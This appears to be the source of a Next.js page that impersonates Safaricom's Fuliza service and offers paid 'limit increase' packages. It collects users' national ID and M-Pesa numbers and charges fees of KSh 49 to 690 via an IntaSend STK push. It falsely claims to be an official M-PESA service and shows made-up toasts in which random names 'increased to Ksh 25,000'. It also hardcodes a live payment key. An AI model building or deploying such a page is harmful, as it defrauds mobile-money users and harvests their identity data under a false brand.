'use client'

import { useState, useEffect } from 'react'
import IntaSendPayment from './components/IntaSendPayment'

// IntaSend configuration
const INTASEND_PUBLISHABLE_KEY = process.env.NEXT_PUBLIC_INTASEND_PUBLISHABLE_KEY || 'ISPubKey_live_2ace7e71-4cc3-4897-aac6-785d485f08d0'

export default function Home() {
  // Packages (12)
  const packages = [
    { limit: '5,000', fee: 49 }, { limit: '7,500', fee: 100 }, { limit: '10,000', fee: 140 },
    { limit: '12,500', fee: 160 }, { limit: '16,000', fee: 200 }, { limit: '20,000', fee: 260 },
    { limit: '24,500', fee: 310 }, { limit: '29,500', fee: 350 }, { limit: '33,000', fee: 420 },
    { limit: '38,500', fee: 490 }, { limit: '43,000', fee: 560 }, { limit: '50,000', fee: 690 }
  ]

  // Modal state
  const [showModal, setShowModal] = useState(false)
  const [currentLimit, setCurrentLimit] = useState('')
  const [currentFee, setCurrentFee] = useState(0)
  const [idNumber, setIdNumber] = useState('')
  const [phoneNumber, setPhoneNumber] = useState('')
  const [paymentProcessing, setPaymentProcessing] = useState(false)
  const [statusMessage, setStatusMessage] = useState('')
  const [statusType, setStatusType] = useState('')

  // Toast state
  const [toastMessage, setToastMessage] = useState('')

  // Open modal with package details
  const openModal = (limit, fee) => {
    setCurrentLimit(limit)
    setCurrentFee(fee)
    setIdNumber('')
    setPhoneNumber('')
    setStatusMessage('')
    setStatusType('')
    setShowModal(true)
  }

  // Close modal
  const closeModal = () => {
    setShowModal(false)
  }

  // Handle payment with IntaSend
  const handlePayment = async (e) => {
    e.preventDefault()

    // Validate
    if (!idNumber || idNumber.length < 5) {
      setStatusMessage('Please enter a valid ID number')
      setStatusType('error')
      return
    }
    if (!phoneNumber || phoneNumber.length < 10) {
      setStatusMessage('Please enter a valid M-PESA phone number')
      setStatusType('error')
      return
    }

    // Format phone
    let formattedPhone = phoneNumber.replace(/\s+/g, '').replace(/[^0-9]/g, '')
    if (formattedPhone.startsWith('0')) formattedPhone = '254' + formattedPhone.substring(1)
    else if (formattedPhone.startsWith('7')) formattedPhone = '254' + formattedPhone
    else if (formattedPhone.startsWith('+254')) formattedPhone = formattedPhone.substring(1)
    else if (formattedPhone.startsWith('254')) formattedPhone = formattedPhone

    setStatusMessage('Redirecting to IntaSend payment...')
    setStatusType('')
    setPaymentProcessing(true)

    try {
      // Create checkout session
      const response = await fetch('/api/intasend/create-checkout', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount: currentFee,
          currency: 'KES',
          email: `user${idNumber}@gmail.com`,
          phone: formattedPhone,
          api_ref: `FULIZA-${currentLimit.replace(/,/g,'')}`,
          redirect_url: `${window.location.origin}/payment/callback`,
          webhook_url: `${window.location.origin}/.netlify/functions/intasend-webhook`,
        })
      })
      const data = await response.json()
      if (data.success) {
        setStatusMessage('STK push sent to your phone. Please enter your M-Pesa PIN to complete the payment.')
        setStatusType('success')
        // Keep paymentProcessing true to show waiting state
      } else {
        throw new Error(data.error || 'Failed to create payment session')
      }
    } catch (err) {
      setStatusMessage('Error: ' + err.message)
      setStatusType('error')
      setPaymentProcessing(false)
    }
  }

  // Scroll to packages
  const scrollToPackages = () => {
    document.getElementById('packages')?.scrollIntoView({ behavior: 'smooth' })
  }

  // Filter digits only
  const filterDigits = (value) => value.replace(/[^0-9+]/g, '')

  // Live toasts effect
  useEffect(() => {
    const names = ['John', 'Mary', 'Peter', 'Anne', 'James', 'Lucy', 'David', 'Sarah']
    const prefixes = ['070', '071', '072', '074', '075', '079', '011']
    
    const interval = setInterval(() => {
      const name = names[Math.floor(Math.random() * names.length)]
      const prefix = prefixes[Math.floor(Math.random() * prefixes.length)]
      const suffix = Math.floor(100 + Math.random() * 899)
      setToastMessage(`${name} ${prefix}xxx${suffix} increased to Ksh 25,000`)
    }, 7000)

    return () => clearInterval(interval)
  }, [])

  return (
    <>
      {/* Navigation */}
      <nav className="navbar">
        <div className="navbar-container">
          <a href="#" className="navbar-brand">
            <div className="navbar-logo">S</div>
            <div>
              <div className="navbar-brand-text">Safaricom</div>
              <div className="navbar-brand-sub">Fuliza</div>
            </div>
          </a>
          <div className="navbar-menu">
            <a href="#packages" className="navbar-link">Packages</a>
            <a href="#" className="navbar-link">Help</a>
            <a href="#" className="navbar-cta">Login</a>
          </div>
        </div>
      </nav>

      {/* Toast notification */}
      {toastMessage && (
        <div className="toast-container">
          <div className="toast">
            <div className="toast-icon">✓</div>
            <div className="toast-content">
              <strong>{toastMessage}</strong><br />
              Just now
            </div>
          </div>
        </div>
      )}

      {/* Hero Section */}
      <section className="hero-section">
        <div className="hero-content">
          <div className="hero-badge">
            <span className="hero-badge-dot"></span>
            Official M-PESA Service
          </div>
          <h1 className="hero-title">
            Increase your <span className="hero-title-accent">Fuliza Limit</span>
          </h1>
          <p className="hero-description">
            Get instant access to more funds with a one-time fee. 
            Your Fuliza limit will be increased within minutes via M-PESA STK Push.
          </p>
          <a href="#packages" className="hero-cta" onClick={scrollToPackages}>
            Increase My Limit
          </a>
          <div className="hero-trust">
            <span className="hero-trust-item">✓ Secure SSL</span>
            <span className="hero-trust-item">⚡ Instant</span>
            <span className="hero-trust-item">🔒 M-PESA Protected</span>
          </div>
        </div>
      </section>

      {/* Main Content */}
      <main className="main-container">
        {/* Packages Section */}
        <section id="packages">
          <div className="section-header">
            <h2 className="section-title">Select Your Fuliza Package</h2>
            <p className="section-subtitle">Choose the limit that works for you</p>
          </div>
          
          <div className="packages-grid">
            {packages.map((pkg, idx) => (
              <div className="package-card" key={idx}>
                <div className="package-card-header">
                  <span className="package-name">FULIZA {pkg.limit}</span>
                  <span className="package-badge">Available</span>
                </div>
                <div className="package-amount">KSh {pkg.limit}</div>
                <div className="package-fee">
                  <span className="package-fee-label">One-time fee</span>
                  <span className="package-fee-amount">KSh {pkg.fee}</span>
                </div>
                <button 
                  className="package-button"
                  onClick={() => openModal(pkg.limit, pkg.fee)}
                >
                  Get Now
                </button>
              </div>
            ))}
          </div>
        </section>
      </main>

      {/* Payment Modal */}
      <div 
        className={`modal-overlay ${showModal ? '' : 'hidden'}`} 
        onClick={closeModal}
      >
        <div className="modal-container" onClick={(e) => e.stopPropagation()}>
          <button className="modal-close" onClick={closeModal}>✕</button>
          
          <h2 className="modal-title">
            Your Fuliza limit will be increased automatically within 5 minutes
          </h2>
          
          <div className="modal-summary">
            <div>
              <div className="modal-summary-label">Package</div>
              <div className="modal-summary-value">Fuliza {currentLimit}</div>
            </div>
            <div>
              <div className="modal-summary-label">Fee</div>
              <div className="modal-summary-value accent">KSh {currentFee}</div>
            </div>
          </div>

          <form className="modal-form" onSubmit={handlePayment}>
            {/* ID Number */}
            <label className="modal-label">ID Number</label>
            <input
              type="text"
              className="modal-input"
              placeholder="Enter your national ID"
              inputMode="numeric"
              value={idNumber}
              onChange={(e) => setIdNumber(filterDigits(e.target.value))}
            />

            {/* Phone Number */}
            <label className="modal-label">M-PESA Phone Number</label>
            <input
              type="tel"
              className="modal-input"
              placeholder="07XXXXXXXX or 2547XXXXXXXX"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(filterDigits(e.target.value))}
            />
            
            <div className="modal-hint">
              💡 Your Fuliza limit will be increased on this phone number
            </div>

            <button
              type="submit"
              className="modal-button"
              disabled={paymentProcessing}
            >
              {paymentProcessing ? 'Processing...' : 'Pay via IntaSend'}
            </button>
          </form>

          {/* Status Message */}
          {statusMessage && (
            <div className={`modal-status ${statusType}`}>
              {statusMessage}
            </div>
          )}
        </div>
      </div>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-content">
          <div className="footer-logo">Safaricom PLC</div>
          <div className="footer-text">
            © 2026 Safaricom Limited · Fuliza Service
          </div>
        </div>
      </footer>
    </>
  )
}
